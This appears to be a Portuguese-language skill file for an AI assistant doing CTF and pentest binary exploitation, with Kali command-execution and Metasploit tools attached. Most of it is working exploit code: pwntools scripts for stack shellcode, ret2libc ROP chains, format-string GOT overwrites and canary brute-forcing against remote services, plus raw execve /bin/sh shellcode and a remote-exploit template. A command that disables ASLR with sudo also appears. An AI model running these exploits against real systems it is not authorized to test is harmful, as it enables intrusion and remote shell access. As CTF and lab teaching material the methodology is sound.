---
name: ctf-bof
description: Use esta skill quando o usuário estiver trabalhando em exploração de binários em um CTF ou pentest e mencionar "buffer overflow", "BOF", "pwn", "ROP", "format string", "heap", "exploit binário", "gdb", "pwntools", "checksec", "ret2libc", "shellcode", "offset", "EIP/RIP control", "stack smashing", ou quiser explorar uma aplicação com vulnerabilidade de memória.
argument-hint: <binário-ou-serviço> [ip:porta]
allowed-tools: [mcp__mcp-kali-server__execute_command, mcp__mcp-kali-server__metasploit_run]
---

# CTF BOF — Binary Exploitation Methodology

Você é um assistente especializado em binary exploitation para CTFs e laboratórios de segurança. Esta skill implementa uma metodologia estruturada para análise e exploração de binários.

## Informações necessárias

Perguntar ao usuário se não tiver:
- Binário local disponível para análise? (nome do arquivo)
- Serviço remoto? (IP:porta)
- Arquitetura alvo (32-bit ou 64-bit)?
- SO alvo (Linux ou Windows)?

## Fase 1 — Análise estática do binário

### Verificar proteções:
Use `execute_command` com:
```bash
# Verificar proteções de segurança
checksec --file=./binary
checksec --file=./binary --format=json

# Identificar arquitetura e tipo
file ./binary
```

**Interpretar resultados do checksec:**

| Proteção | Habilitada | Impacto |
|----------|-----------|---------|
| **NX/DEP** | Sim | Shellcode na stack não executa → precisa ROP |
| **NX/DEP** | Não | Shellcode direto na stack |
| **PIE** | Sim | Endereços aleatórios → precisa de leak |
| **PIE** | Não | Endereços fixos → exploração mais simples |
| **Stack Canary** | Sim | Precisa leakar o canary antes de overflow |
| **Stack Canary** | Não | Overflow direto |
| **RELRO Full** | Sim | GOT não é modificável |
| **RELRO Partial** | Não | GOT modificável → GOT overwrite |

### Análise com Ghidra/radare2:
```bash
# Ghidra (GUI)
ghidra &

# radare2 (linha de comando)
r2 ./binary
> aaa          # análise completa
> afl          # listar funções
> pdf @main    # descompilar main
> pdf @vuln    # descompilar função vulnerável

# strings para informações rápidas
strings ./binary | grep -E "flag|password|pass|key|secret"
strings ./binary | grep "http\|flag{"
```

## Fase 2 — Fuzzing e encontrar offset

### Causar crash:
Use `execute_command` com Python para gerar payloads crescentes:
```bash
python3 -c "print('A' * 100)" | ./binary
python3 -c "print('A' * 500)" | ./binary
python3 -c "print('A' * 1000)" | ./binary
```

### Encontrar offset exato:
```bash
# Gerar padrão único com metasploit
msf-pattern_create -l 500
# Saída: Aa0Aa1Aa2Aa3...

# Enviar padrão e coletar valor de EIP/RIP no crash
python3 -c "import sys; sys.stdout.buffer.write(b'Aa0Aa1Aa2Aa3...')" | ./binary

# Calcular offset do valor no EIP/RIP
msf-pattern_offset -l 500 -q 0x39614138  # EIP value

# Alternativamente com pwntools
python3 -c "
from pwn import *
io = process('./binary')
io.sendline(cyclic(500))
io.wait()
core = io.corefile
print('EIP:', hex(core.eip))   # 32-bit
print('RIP:', hex(core.rip))   # 64-bit  
print('Offset:', cyclic_find(core.eip))  # 32-bit
"
```

### Confirmar controle de EIP/RIP:
```bash
python3 -c "
from pwn import *
offset = 112  # valor encontrado
payload = b'A' * offset + b'B' * 4  # EIP = 0x42424242
io = process('./binary')
io.sendline(payload)
io.wait()
core = io.corefile
print(hex(core.eip))  # deve ser 0x42424242
"
```

## Fase 3 — Exploração sem proteções (NX=off, sem ASLR)

### Shellcode na stack:
```bash
python3 -c "
from pwn import *

context.arch = 'i386'  # ou 'amd64'
context.os = 'linux'

# Shellcode execve /bin/sh
shellcode = asm(shellcraft.sh())

# Encontrar endereço da stack (via gdb)
# gdb ./binary: r < <(python3 -c 'print(\"A\"*200)'), depois x/50x \$esp
stack_addr = 0xffffd5c0  # ajustar conforme gdb

offset = 112
payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p32(stack_addr)  # ou p64() para 64-bit

io = process('./binary')
io.sendline(payload)
io.interactive()
"
```

### Variável de ambiente com shellcode (mais confiável):
```bash
python3 -c "
import os, ctypes, subprocess
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
nop_sled = b'\x90' * 200
env = {'EGG': nop_sled + shellcode}
# Calcular endereço com getenvaddr.c ou python
"
```

## Fase 4 — ROP Chain (NX=on)

### Identificar gadgets:
```bash
# ROPgadget
ROPgadget --binary ./binary --rop --badbytes '0a'

# Pwntools ROP
python3 -c "
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
rop.raw(rop.find_gadget(['ret']))  # stack alignment
rop.system(next(elf.search(b'/bin/sh')))
print(rop.dump())
"

# ropper
ropper -f ./binary --search 'pop rdi; ret'
```

### ret2plt / ret2libc:
```bash
python3 -c "
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')  # ou encontrar versão correta

# Se PIE=off e parcial RELRO:
# 1. Chamar puts(puts@got) para leakar endereço de libc
# 2. Calcular base de libc: leaked - puts_libc_offset
# 3. Segunda chamada com system('/bin/sh')

offset = 40
pop_rdi = next(elf.search(asm('pop rdi; ret')))  # 64-bit
ret = next(elf.search(asm('ret')))  # stack alignment

# Fase 1: leak
payload1 = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],  # argumento: GOT de puts
    elf.plt['puts'],  # chamar puts
    elf.symbols['main']  # retornar para main
)

io = process('./binary')
io.sendline(payload1)
io.recvline()  # prompt
leaked_puts = u64(io.recvline()[:6].ljust(8, b'\x00'))
libc_base = leaked_puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# Fase 2: shell
payload2 = flat(
    b'A' * offset,
    ret,          # stack alignment para x86_64
    pop_rdi,
    bin_sh,
    system
)
io.sendline(payload2)
io.interactive()
"
```

## Fase 5 — Format String

### Detectar:
```bash
echo "%p %p %p %p %p %p" | ./binary
echo "%x %x %x %x %x %x" | ./binary
# Se retornar endereços → format string confirmado!
```

### Leakar memória:
```bash
python3 -c "
# Posicionar nossa string na stack e leakar
# Formato: AAAA%p.%p.%p... até ver 0x41414141
print('AAAA' + '.%p' * 30)
"

# Com pwntools
python3 -c "
from pwn import *
from fmtstr_payload import *  # ou usar FmtStr

io = process('./binary')
io.sendline('AAAA.%7\$p')  # posição 7 na stack

resp = io.recvline()
print(resp)
"
```

### Escrita arbitrária (sem RELRO Full):
```bash
python3 -c "
from pwn import *

elf = ELF('./binary')
target_addr = elf.got['exit']  # sobrescrever exit@GOT
new_value = elf.symbols['win']  # ou endereço do shellcode

# Calcular offset da posição na stack primeiro
# python3 -c 'print(\"%p.\"*50)' | ./binary → encontrar posição

offset = 6  # posição onde nossa string aparece na stack
payload = fmtstr_payload(offset, {target_addr: new_value})

io = process('./binary')
io.sendline(payload)
io.interactive()
"
```

## Fase 6 — Canary Bypass

### Brute force (32-bit, processos que fazem fork):
```bash
python3 -c "
import socket, struct

# Canary em x86 tem formato: \x00XXXXXX (último byte é null)
# Bruteforce byte a byte

def test_canary_byte(ip, port, offset, canary_so_far, byte):
    s = socket.socket()
    s.connect((ip, port))
    # Padding + canary atual + byte testado
    payload = b'A' * offset + canary_so_far + bytes([byte])
    s.send(payload + b'\n')
    response = s.recv(1024)
    s.close()
    return b'CRASH' not in response  # ajustar conforme app

canary = b'\x00'
for i in range(3):  # 3 bytes para completar canary 32-bit
    for byte in range(256):
        if test_canary_byte('target', 1337, 100, canary, byte):
            canary += bytes([byte])
            break

print('Canary:', hex(int.from_bytes(canary, 'little')))
"
```

### Leak via format string (mais comum):
```bash
# Encontrar posição do canary na stack com format string
python3 -c "
from pwn import *
io = process('./binary')
# Enviar format string para leakar o canary
io.sendline('%31\$p')  # ajustar posição
canary = int(io.recvline().strip(), 16)
print(hex(canary))
"
```

## Fase 7 — Exploração remota

Adaptar para serviço remoto:

```bash
python3 -c "
from pwn import *

# Trocar process() por remote()
io = remote('<TARGET_IP>', 1337)

# Resto do exploit igual ao local
# Mas atenção: ASLR no remoto pode ser diferente
# Se precisar de leak → fase com ROP para leakar libc

io.sendline(payload)
io.interactive()
"
```

### Se tiver ASLR no remoto mas versão de libc conhecida:
```bash
# Identificar versão de libc
# Leakar endereço de função conhecida
# Calcular base: leaked_addr - libc.symbols['funcao']
# Buscar libc por offset: https://libc.rip (API pública)

python3 -c "
from pwn import *

# Após leakar puts no remoto:
leaked_puts = 0x7f1234567890

# Usar libc database local
# apt install glibc-tools
# libc-database -f puts 0x890  (últimos 3 nibbles)
"
```

## Dicas do 0xdf para pwn

- **Sempre começar com checksec**: define completamente a estratégia de exploit
- **gdb-peda/pwndbg**: muito mais poderoso que gdb padrão
  ```bash
  pip install pwndbg  # ou peda
  gdb -q ./binary
  ```
- **ASLR local**: desabilitar para testes locais
  ```bash
  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
  ```
- **strace para entender I/O**: `strace ./binary`
- **ltrace para ver chamadas de biblioteca**: `ltrace ./binary`
- **Pwntools template**: usar `pwn template ./binary > exploit.py` como base

## Template de exploit base

```python
#!/usr/bin/env python3
from pwn import *

# Setup
context.log_level = 'debug'
context.arch = 'amd64'  # ou 'i386'

elf = ELF('./binary')
# libc = ELF('./libc.so.6')

LOCAL = True
if LOCAL:
    io = process('./binary')
else:
    io = remote('TARGET_IP', 1337)

# Helpers
def send_payload(payload):
    io.recvuntil(b'> ')  # ajustar prompt
    io.sendline(payload)

# Offset
OFFSET = 40  # ajustar

# Exploit
payload = b'A' * OFFSET
payload += p64(0xdeadbeef)  # EIP/RIP control

send_payload(payload)
io.interactive()
```
